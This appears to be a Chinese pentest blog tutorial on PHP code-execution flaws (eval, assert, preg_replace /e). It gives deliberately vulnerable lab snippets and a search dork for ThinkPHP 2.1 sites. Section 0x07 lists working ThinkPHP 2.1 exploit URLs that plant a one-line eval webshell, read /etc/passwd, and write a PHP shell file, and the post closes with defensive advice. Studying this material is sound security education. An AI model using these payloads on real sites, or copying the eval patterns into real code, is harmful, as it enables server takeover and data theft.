---
draft: false
date: 2016-07-25 22:32:51
title: 代码执行漏洞(一)
description: 
categories:
  - Pentest
tags:
  - rce
---

### 0x00 代码执行
当应用在调用一些能将字符转化为代码的函数(如PHP中的eval)时，没有考虑用户是否能控制这个字符串，这就会造成代码执行漏洞。

### 0x01 相关函数
```
PHP：eval assert
Python：exec
asp：<%=CreateObject(“wscript.shell”).exec(“cmd.exe /c ipconfig”).StdOut.ReadAll()%>
Java：没有类似函数，但采用的反射机制和各种基于反射机制的表达式引擎(OGNL、SpEL、MVEL等)有类似功能
```

### 0x02 phpcms中的string2array函数
这个函数可以将phpcms的数据库settings的字符串形式的数组内容转换为真实的数组
```
array(  //这个是字符串形式的数组，它并不是数组，而是字符串
    'upload_maxsize' => '2048',
    'upload_allowext' => 'jpg|jpeg|gif|bmp|png|doc|docx|xls|xlsx|ppt|pptx|pdf|txt|rar|zip|swf', 
    'watermark_enable' => '1',
    'watermark_minwidth' => '300',
    'watermark_minheight' => '300',
    'watermark_img' => '/statics/img/water/mark.png',
    'watermark_pct' => '85',
    'watermark_quality' => '80',
    'watermark_pos' => '9',
)
```
```php
function string2array($data) {
    //这个函数可以将字符串$data转化为数组
    if($data == '') 
        return array(); 
    @eval("\$array = $data;"); 
        return $array;
}
```

### 0x03 漏洞危害
* 执行代码
* 让网站写shell
* 甚至控制服务器

### 0x04 漏洞分类(也是利用点)
```
执行代码的函数：eval、assert
callback函数：preg_replace + /e模式
反序列化：unserialize()(反序列化函数)
```

### 0x05 漏洞挖掘
```
框架找漏洞，如ThinkPHP：
  inurl:index.php intext:ThinkPHP 2.1 { Fast & Simple OOP PHP Framework }
框架的URL格式如下：
  Site:Port/Module name/Method name/Property name/Preperty value
  Site:Port/index.php?m=Module_name&f=Method_name&v=Preperty_value
  
  www.xx.com:88/News/show/id/328
  www.yy.com:99/index.php?m=News&f=detail&item=23
  www.zz.com/global_cms_contentview_id_2435
```

### 0x06 搭建环境实验
* 示例一
```php
<?php
    $data = $_GET['data'];
    eval("\$ret = $data;");
    echo $ret;
?>
```
![代码执行漏洞使用eval函数1](/img/post/code_execution_eval1.png)

* 示例二
```php
<?php
    $data = $_GET['data'];
    eval("\$ret = strtolower('$data');");
    echo $ret;
?>
```
![代码执行漏洞使用eval函数2](/img/post/code_execution_eval2.png)

* 示例三
```php
<?php
    $data = $_GET['data'];
    eval("\$ret = strtolower(\"$data\");");
    echo $ret;
?>
```
![代码执行漏洞使用eval函数3](/img/post/code_execution_eval3.png)
![代码执行漏洞使用eval函数4](/img/post/code_execution_eval4.png)

* 示例四
```php
<?php
    $data = $_GET['data'];
    eval("\$ret = strtolower(\"$data\");");
    echo $ret;
?>
```
![代码执行漏洞使用eval函数5](/img/post/code_execution_eval5.png)
![代码执行漏洞使用eval函数6](/img/post/code_execution_eval6.png)

* 示例五  
mixed preg_replace ( mixed pattern, mixed replacement, mixed subject [, int limit])  
/e修正符使preg_replace()将replacement参数当作PHP 代码(在适当的逆向引用替换完之后)
```php
<?php
    $data = $_GET['data'];
    $ret = preg_replace('/<data>(.*?)<\/data>/e','$ret = "\\1"',$data);
    echo $ret;
?>
```
![代码执行漏洞使用preg_replace函数](/img/post/code_execution_preg_replace.png)

### 0x07 具体操作
```
# 一般找CMS相应版本漏洞，如ThinkPHP2.1
* 一句话
    http://www.xxx.com/News/detail/id/{${@eval($_POST[aa])}}
* 得到当前路径
    http://www.xxx.com/News/detail/id/{${print(getcwd()))}}
* 读文件
    http://www.xxx.com/News/detail/id/{${exit(var_dump(file_get_contents($_POST['f'])))}}
    POST的数据为：f=/etc/passwd
* 写shell
    http://www.xxx.com/News/detail/id/{${exit(var_dump(file_put_contents($_POST['f'],$_POST[d])))}}
    POST的数据为：f=1.php&d=<?php @eval($_POST['aa'])?>
```

### 0x08 漏洞防御
* 使用json保存数组，当读取时就不需要使用eval了
* 对于必须使用eval的地方，一定严格处理用户数据
* 字符串使用单引号包括可控代码，插入前使用addslashes转义
* 放弃使用preg_replace的e修饰符，使用preg_replace_callback()替换
* 若必须使用preg_replace的e修饰符，则必用单引号包裹正则匹配出的对象

#### 下一篇：[代码执行漏洞(二)](/posts/2016/code-execution-vulnerabilities-2/)
